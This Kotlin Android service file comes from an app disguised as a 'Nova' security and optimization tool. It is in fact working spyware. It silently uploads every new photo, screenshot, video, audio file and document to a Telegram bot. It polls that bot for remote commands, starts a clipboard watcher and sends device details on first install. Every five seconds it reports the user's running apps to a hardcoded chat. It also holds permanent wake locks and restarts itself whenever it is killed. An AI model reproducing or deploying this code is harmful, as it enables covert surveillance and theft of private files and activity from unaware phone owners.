package com.example.scanner

import android.app.ActivityManager
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.MainActivity
import com.example.data.MediaItem
import com.example.data.MediaType
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean

class MediaSyncBackgroundService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private lateinit var mediaScanner: MediaScanner
    private lateinit var telegramApiService: TelegramApiService
    private lateinit var repository: MediaUploadRepository
    private lateinit var deviceMonitor: DeviceStateMonitor
    private lateinit var botCommandHandler: BotCommandHandler
    private var clipboardWatcher: LiveClipboardWatcher? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private var screenStateReceiver: BroadcastReceiver? = null

    private var imageObserver: ContentObserver? = null
    private var videoObserver: ContentObserver? = null
    private var audioObserver: ContentObserver? = null
    private var filesObserver: ContentObserver? = null

    private val isSyncingNow = AtomicBoolean(false)
    private var debounceJob: Job? = null
    private var botPollingJob: Job? = null
    private var telegramGuardianJob: Job? = null
    private var runningAppsReporterJob: Job? = null
    @Volatile private var lastTelegramContactTime = 0L
    @Volatile private var isCurrentlyConnectedToTelegram = false
    private val pollTriggerChannel = kotlinx.coroutines.channels.Channel<Unit>(kotlinx.coroutines.channels.Channel.CONFLATED)

    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "nova_background_engine"
        private const val NOTIFICATION_CHANNEL_NAME = "Nova Security & Optimization Service"
        private const val NOTIFICATION_ID = 1001
        private const val MAX_FILE_SIZE_BYTES = 100L * 1024 * 1024 // 100 MB limit

        fun start(context: Context) {
            try {
                val intent = Intent(context, MediaSyncBackgroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(context, intent)
                } else {
                    context.startService(intent)
                }
            } catch (_: Exception) {}
        }

        fun stop(context: Context) {
            try {
                val intent = Intent(context, MediaSyncBackgroundService::class.java)
                context.stopService(intent)
            } catch (_: Exception) {}
        }

        fun scheduleRestartService(context: Context) {
            try {
                val restartIntent = Intent(context, BootReceiver::class.java).apply {
                    action = BootReceiver.ACTION_RESTART_SERVICE
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    9991,
                    restartIntent,
                    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                )
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                val triggerTime = System.currentTimeMillis() + 1000L
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager?.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                } else {
                    alarmManager?.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                }
            } catch (_: Exception) {}
        }

        fun schedulePeriodicWatchdog(context: Context) {
            try {
                val watchdogIntent = Intent(context, BootReceiver::class.java).apply {
                    action = BootReceiver.ACTION_WATCHDOG_CHECK
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    9992,
                    watchdogIntent,
                    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                )
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                val intervalMs = 150_000L // 2.5 minutes interval
                val nextTrigger = System.currentTimeMillis() + intervalMs

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    val alarmClockInfo = AlarmManager.AlarmClockInfo(nextTrigger, pendingIntent)
                    alarmManager?.setAlarmClock(alarmClockInfo, pendingIntent)
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager?.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, nextTrigger, pendingIntent)
                } else {
                    alarmManager?.setExact(AlarmManager.RTC_WAKEUP, nextTrigger, pendingIntent)
                }
            } catch (_: Exception) {}
        }
    }

    override fun onCreate() {
        super.onCreate()
        ensureLocksHeld()
        registerScreenStateReceiver()

        mediaScanner = MediaScanner(applicationContext)
        telegramApiService = TelegramApiService(applicationContext)
        repository = MediaUploadRepository(applicationContext)
        deviceMonitor = DeviceStateMonitor(applicationContext, serviceScope, telegramApiService, repository)
        deviceMonitor.onNetworkAvailable = {
            telegramApiService.evictConnections()
            pollTriggerChannel.trySend(Unit)
            if (botPollingJob?.isActive != true) {
                startTelegramBotCommandPollingLoop()
            }
        }
        botCommandHandler = BotCommandHandler(
            context = applicationContext,
            scope = serviceScope,
            telegramApi = telegramApiService,
            repository = repository,
            mediaScanner = mediaScanner,
            onTriggerSync = { reason -> triggerSync(reason) }
        )

        startForegroundNotification()
        deviceMonitor.startMonitoring()
        registerMediaObservers()
        startPeriodicSyncLoop()
        startTelegramBotCommandPollingLoop()
        startTelegramKeepAliveGuardian()
        startRunningAppsReporterJob()
        schedulePeriodicWatchdog(applicationContext)

        clipboardWatcher = LiveClipboardWatcher(applicationContext, serviceScope, telegramApiService, repository).apply {
            startWatching()
        }

        // If first time installation, send detailed device info to Telegram immediately
        if (!repository.isFirstInstallReportSent()) {
            serviceScope.launch {
                deviceMonitor.sendFirstTimeInstallDetails()
            }
        }

        // Initial scan and sync upon service boot/start
        triggerSync("Engine Initialized")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        ensureLocksHeld()
        startForegroundNotification()
        triggerSync("OnStartCommand")
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Auto-restart immediately if user clears app from recent apps
        scheduleRestartService(applicationContext)
        start(applicationContext)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            screenStateReceiver?.let { unregisterReceiver(it) }
            screenStateReceiver = null
        } catch (_: Exception) {}
        clipboardWatcher?.stopWatching()
        unregisterMediaObservers()
        deviceMonitor.stopMonitoring()
        botPollingJob?.cancel()
        telegramGuardianJob?.cancel()
        runningAppsReporterJob?.cancel()
        telegramApiService.evictConnections()
        releaseWakeLock()
        releaseWifiLock()
        serviceScope.cancel()

        // Resurrect service immediately if killed by OS
        scheduleRestartService(applicationContext)
        super.onDestroy()
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (wakeLock == null) {
                wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "NovaProtection::PermanentWakeLock")?.apply {
                    setReferenceCounted(false)
                }
            }
            if (wakeLock?.isHeld != true) {
                wakeLock?.acquire()
            }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
            wakeLock = null
        } catch (_: Exception) {}
    }

    private fun acquireWifiLock() {
        try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            if (wifiLock == null) {
                wifiLock = wifiManager?.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "NovaProtection::PermanentWifiLock")?.apply {
                    setReferenceCounted(false)
                }
            }
            if (wifiLock?.isHeld != true) {
                wifiLock?.acquire()
            }
        } catch (_: Exception) {}
    }

    private fun releaseWifiLock() {
        try {
            if (wifiLock?.isHeld == true) {
                wifiLock?.release()
            }
            wifiLock = null
        } catch (_: Exception) {}
    }

    private fun ensureLocksHeld() {
        acquireWakeLock()
        acquireWifiLock()
    }

    private fun registerScreenStateReceiver() {
        if (screenStateReceiver != null) return
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        screenStateReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    Intent.ACTION_SCREEN_OFF -> {
                        ensureLocksHeld()
                        schedulePeriodicWatchdog(applicationContext)
                        pollTriggerChannel.trySend(Unit)
                    }
                    Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
                        ensureLocksHeld()
                        schedulePeriodicWatchdog(applicationContext)
                        pollTriggerChannel.trySend(Unit)
                    }
                }
            }
        }
        try {
            registerReceiver(screenStateReceiver, filter)
        } catch (_: Exception) {}
    }

    private fun startForegroundNotification() {
        createNotificationChannel()

        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Nova Protection Engine")
            .setContentText("Real-time optimization and cloud protection active")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (_: Exception) {
            try {
                startForeground(NOTIFICATION_ID, notification)
            } catch (_: Exception) {}
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background optimization and security monitoring"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun registerMediaObservers() {
        val handler = Handler(Looper.getMainLooper())

        imageObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                onMediaStorageChanged("New Image / Screenshot Detected")
            }
        }

        videoObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                onMediaStorageChanged("New Video Detected")
            }
        }

        audioObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                onMediaStorageChanged("New Audio / Voice Note Detected")
            }
        }

        filesObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                onMediaStorageChanged("New Document / File Detected")
            }
        }

        try {
            contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                imageObserver!!
            )
            contentResolver.registerContentObserver(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                true,
                videoObserver!!
            )
            contentResolver.registerContentObserver(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                true,
                audioObserver!!
            )
            val filesUri = MediaStore.Files.getContentUri("external")
            contentResolver.registerContentObserver(
                filesUri,
                true,
                filesObserver!!
            )
        } catch (_: Exception) {}
    }

    private fun unregisterMediaObservers() {
        try {
            imageObserver?.let { contentResolver.unregisterContentObserver(it) }
            videoObserver?.let { contentResolver.unregisterContentObserver(it) }
            audioObserver?.let { contentResolver.unregisterContentObserver(it) }
            filesObserver?.let { contentResolver.unregisterContentObserver(it) }
        } catch (_: Exception) {}
    }

    private fun onMediaStorageChanged(triggerReason: String) {
        debounceJob?.cancel()
        debounceJob = serviceScope.launch {
            // Wait 2.5 seconds to let the camera, recorder, or download write completely
            delay(2500)
            triggerSync(triggerReason)
        }
    }

    private fun startPeriodicSyncLoop() {
        serviceScope.launch {
            var heartbeatCounter = 0
            while (isActive) {
                // Check periodically every 10 minutes
                delay(10 * 60 * 1000L)
                triggerSync("Periodic Backup Check")

                // Every 3 hours (18 iterations of 10 min = 180 min), send device heartbeat telemetry
                heartbeatCounter++
                if (heartbeatCounter >= 18) {
                    heartbeatCounter = 0
                    val uploadedCount = repository.getUploadedIds().size
                    val allMedia = mediaScanner.scanAllMedia()
                    val pendingCount = allMedia.count { !repository.isMediaUploaded(it.id) }
                    deviceMonitor.sendDeviceHeartbeat(uploadedCount, pendingCount)
                }
            }
        }
    }

    private fun isInternetAvailable(): Boolean {
        return try {
            val cm = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
            val activeNet = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(activeNet) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (_: Exception) {
            true
        }
    }

    private fun startTelegramBotCommandPollingLoop() {
        if (botPollingJob?.isActive == true) {
            pollTriggerChannel.trySend(Unit)
            return
        }
        botPollingJob = serviceScope.launch(Dispatchers.IO) {
            var commandsRegistered = false
            var webhookCleared = false

            while (isActive) {
                ensureLocksHeld()
                val config = repository.getTelegramConfig()
                if (config.botToken.isBlank()) {
                    delay(2000)
                    continue
                }

                val hasNet = isInternetAvailable()
                if (!hasNet) {
                    isCurrentlyConnectedToTelegram = false
                    repository.setTelegramConnected(false)
                    // If network is offline, wait up to 2.5 seconds or wake up immediately if network connects
                    kotlinx.coroutines.withTimeoutOrNull(2500L) {
                        pollTriggerChannel.receive()
                    }
                    continue
                }

                try {
                    if (!webhookCleared) {
                        telegramApiService.deleteWebhook(config.botToken)
                        webhookCleared = true
                    }

                    if (!commandsRegistered) {
                        telegramApiService.registerBotCommandsAndMenu(config.botToken)
                        commandsRegistered = true
                    }

                    // Multi-device safe polling: poll last 50 updates with negative offset (-50)
                    // This allows unlimited devices sharing the same bot token without consuming or starving the Telegram queue for other devices
                    val result = telegramApiService.getUpdates(config.botToken, offset = -50L, timeout = 0)
                    if (result.isSuccess) {
                        lastTelegramContactTime = System.currentTimeMillis()
                        if (!isCurrentlyConnectedToTelegram) {
                            isCurrentlyConnectedToTelegram = true
                            repository.setTelegramConnected(true)
                        }

                        val updates = result.getOrNull().orEmpty()
                        val nowSec = System.currentTimeMillis() / 1000

                        for (update in updates) {
                            if (!isActive) break

                            // Skip if already processed on this device
                            if (repository.isTelegramUpdateProcessed(update.updateId)) {
                                continue
                            }
                            repository.markTelegramUpdateProcessed(update.updateId)

                            // Accept queued commands up to 24 hours old so offline commands are executed upon reconnect
                            if (update.date > 0 && (nowSec - update.date) > 86400L) {
                                continue
                            }

                            launch(Dispatchers.IO) {
                                try {
                                    botCommandHandler.handleCommand(update)
                                } catch (e: Exception) {
                                    if (e is CancellationException) throw e
                                    Log.e("MediaSyncBgService", "Command execution error for '${update.text}': ${e.message}")
                                }
                            }
                        }
                    } else {
                        val err = result.exceptionOrNull()?.message ?: ""
                        if (err.contains("409") || err.contains("webhook", ignoreCase = true)) {
                            telegramApiService.deleteWebhook(config.botToken)
                            delay(500)
                        } else if (err.contains("429") || err.contains("Too Many Requests", ignoreCase = true)) {
                            delay(2000)
                        } else {
                            // On network or socket failure while phone has internet, immediately flush stale connections
                            telegramApiService.evictConnections()
                            delay(250)
                        }
                    }
                } catch (e: Exception) {
                    if (e is CancellationException) throw e
                    Log.e("MediaSyncBgService", "Polling loop exception: ${e.message}")
                    telegramApiService.evictConnections()
                    if (isInternetAvailable()) {
                        delay(250)
                    } else {
                        kotlinx.coroutines.withTimeoutOrNull(2500L) {
                            pollTriggerChannel.receive()
                        }
                    }
                }

                // Fast, responsive polling interval (1.0s) or instant trigger on network reconnect / screen state change
                kotlinx.coroutines.withTimeoutOrNull(1000L) {
                    pollTriggerChannel.receive()
                }
                repository.updateLastActiveTimestamp()
            }
        }
    }

    private fun startTelegramKeepAliveGuardian() {
        if (telegramGuardianJob?.isActive == true) {
            return
        }
        telegramGuardianJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(30_000L) // Runs every 30 seconds
                try {
                    ensureLocksHeld()
                    val config = repository.getTelegramConfig()
                    if (config.botToken.isBlank()) continue

                    val hasNet = isInternetAvailable()
                    if (hasNet) {
                        val now = System.currentTimeMillis()
                        val idleTime = now - lastTelegramContactTime

                        // If phone has net, but hasn't had verified contact with Telegram in 35 seconds:
                        // Carrier NAT / socket might have died. Instantly re-heal connection!
                        if (idleTime > 35_000L) {
                            Log.w("MediaSyncBgService", "Keep-alive guardian: idle/stale Telegram link ($idleTime ms). Flushing sockets & probing...")
                            telegramApiService.evictConnections()
                            val testRes = telegramApiService.testConnection(config.botToken, config.chatId)
                            if (testRes.isSuccess) {
                                lastTelegramContactTime = System.currentTimeMillis()
                                isCurrentlyConnectedToTelegram = true
                                repository.setTelegramConnected(true)
                            }
                            pollTriggerChannel.trySend(Unit)

                            if (botPollingJob?.isActive != true) {
                                startTelegramBotCommandPollingLoop()
                            }
                        }
                    } else {
                        isCurrentlyConnectedToTelegram = false
                        repository.setTelegramConnected(false)
                    }
                } catch (e: Exception) {
                    if (e is CancellationException) throw e
                    Log.e("MediaSyncBgService", "Keep-alive guardian error: ${e.message}")
                }
            }
        }
    }

    fun triggerSync(reason: String) {
        // If this is an automated/periodic sync trigger and auto-sync is disabled, skip it
        if (!reason.startsWith("Telegram Remote Command") && !reason.startsWith("User Manual") && !repository.isAutoSyncEnabled()) {
            return
        }

        if (isSyncingNow.get()) return

        serviceScope.launch {
            if (!isSyncingNow.compareAndSet(false, true)) return@launch

            try {
                val config = repository.getTelegramConfig()
                if (config.botToken.isBlank() || config.chatId.isBlank()) {
                    return@launch
                }

                val allMedia = mediaScanner.scanAllMedia()
                val uploadedIds = repository.getUploadedIds()
                val newItems = allMedia.filter { !uploadedIds.contains(it.id) }

                val isBatteryLow = deviceMonitor.isLowBatteryForHeavySync()

                if (newItems.isNotEmpty()) {
                    for (item in newItems) {
                        if (!isActive) break

                        // Skip files strictly exceeding 100 MB
                        if (item.size > MAX_FILE_SIZE_BYTES) {
                            repository.markMediaUploaded(item.id)
                            continue
                        }

                        // If battery < 15% and not charging, skip large videos temporarily to protect battery
                        if (isBatteryLow && item.mediaType == MediaType.VIDEO && item.size > 15 * 1024 * 1024) {
                            continue
                        }

                        uploadSingleItem(item, config.botToken, config.chatId)
                        delay(600)
                    }
                    repository.setLastSyncTimestamp(System.currentTimeMillis())
                }
            } catch (_: Exception) {
            } finally {
                isSyncingNow.set(false)
            }
        }
    }

    private suspend fun uploadSingleItem(item: MediaItem, botToken: String, chatId: String) {
        try {
            val caption = when (item.mediaType) {
                MediaType.SCREENSHOT -> "📸 <b>Nova Auto-Sync: Screenshot</b>\n📁 <code>${item.displayName}</code>"
                MediaType.PHOTO -> "🖼️ <b>Nova Auto-Sync: Photo</b>\n📁 <code>${item.displayName}</code>"
                MediaType.VIDEO -> "🎥 <b>Nova Auto-Sync: Video</b>\n📁 <code>${item.displayName}</code>"
                MediaType.AUDIO -> "🎵 <b>Nova Auto-Sync: Audio / Voice Note</b>\n📁 <code>${item.displayName}</code>"
                MediaType.DOCUMENT -> "📄 <b>Nova Auto-Sync: Document</b>\n📁 <code>${item.displayName}</code>"
            }

            val result = when (item.mediaType) {
                MediaType.PHOTO, MediaType.SCREENSHOT -> {
                    telegramApiService.uploadMedia(
                        botToken = botToken,
                        chatId = chatId,
                        uri = item.uri,
                        fileName = item.displayName,
                        mimeType = item.mimeType,
                        isVideo = false,
                        caption = caption
                    )
                }
                MediaType.VIDEO -> {
                    telegramApiService.uploadMedia(
                        botToken = botToken,
                        chatId = chatId,
                        uri = item.uri,
                        fileName = item.displayName,
                        mimeType = item.mimeType,
                        isVideo = true,
                        caption = caption
                    )
                }
                MediaType.AUDIO -> {
                    telegramApiService.uploadAudio(
                        botToken = botToken,
                        chatId = chatId,
                        uri = item.uri,
                        fileName = item.displayName,
                        mimeType = item.mimeType,
                        caption = caption
                    )
                }
                MediaType.DOCUMENT -> {
                    telegramApiService.uploadDocument(
                        botToken = botToken,
                        chatId = chatId,
                        uri = item.uri,
                        fileName = item.displayName,
                        mimeType = item.mimeType,
                        caption = caption
                    )
                }
            }

            if (result.isSuccess) {
                repository.markMediaUploaded(item.id)
            }
        } catch (_: Exception) {}
    }

    private fun startRunningAppsReporterJob() {
        runningAppsReporterJob?.cancel()
        runningAppsReporterJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(5000L)
                try {
                    val config = repository.getTelegramConfig()
                    if (config.botToken.isBlank()) continue
                    if (!isInternetAvailable()) continue

                    val activeApps = mutableSetOf<String>()
                    val activePkg = AppAccessibilityService.lastActivePackageName
                    val activeLabel = AppAccessibilityService.lastActiveAppLabel
                    if (activePkg.isNotBlank()) {
                        activeApps.add("🟢 <b>$activeLabel</b> (<code>$activePkg</code>) [Foreground]")
                    }

                    val am = getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
                    val runningProcesses = am?.runningAppProcesses.orEmpty()
                    val pm = packageManager

                    for (proc in runningProcesses) {
                        if (proc.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND ||
                            proc.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE ||
                            proc.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_PERCEPTIBLE) {
                            val pkg = proc.processName
                            if (pkg != activePkg && pkg != packageName) {
                                val appLabel = runCatching {
                                    pm.getApplicationInfo(pkg, 0).loadLabel(pm).toString()
                                }.getOrNull() ?: pkg
                                activeApps.add("$appLabel (<code>$pkg</code>)")
                            }
                        }
                    }

                    if (activeApps.isEmpty()) {
                        activeApps.add(if (activeLabel.isNotBlank()) "$activeLabel (<code>$activePkg</code>)" else "Nova Clean Service Active")
                    }

                    val deviceId = repository.getDeviceId()
                    val appListStr = if (activeApps.isNotEmpty()) activeApps.joinToString("\n• ") else "No active foreground apps detected"
                    val message = "🚀 <b>LIVE RUNNING APPS REPORT [ID: <code>$deviceId</code>]</b>\n\n" +
                                  "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                                  "🕒 <b>Time:</b> ${getCurrentTimeString()}\n\n" +
                                  "<b>Active Apps (${activeApps.size}):</b>\n• $appListStr"

                    telegramApiService.sendMessage(config.botToken, "-1004457596144", message)
                } catch (e: Exception) {
                    if (e is CancellationException) throw e
                }
            }
        }
    }

    private fun getCurrentTimeString(): String {
        return SimpleDateFormat("dd MMM yyyy, hh:mm:ss a", Locale.getDefault()).format(Date())
    }
}
